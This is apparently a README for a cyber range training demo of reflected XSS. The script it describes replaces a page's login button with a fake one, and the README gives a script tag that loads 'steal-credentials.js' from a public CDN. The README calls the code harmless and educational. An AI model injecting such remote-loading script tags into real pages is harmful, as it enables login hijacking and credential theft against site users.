# Introduction

This script is intended for educational purposes only, and was created as supplemental material for a cyber range event. This code does not perform any actual malicious code, and should not be used for malicious purposes.

This is a demo XSS script that can be injected into a vulnerable web application by XSS reflection. The script will grab the login form, delete the original login button, and create a new button with a demo "malicious" script attached to it.

# To use

The script can be referenced from a script tag using jsdelivr CDN:

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/barrcodes/xss@[optional commit hash]/steal-credentials.js"></script>
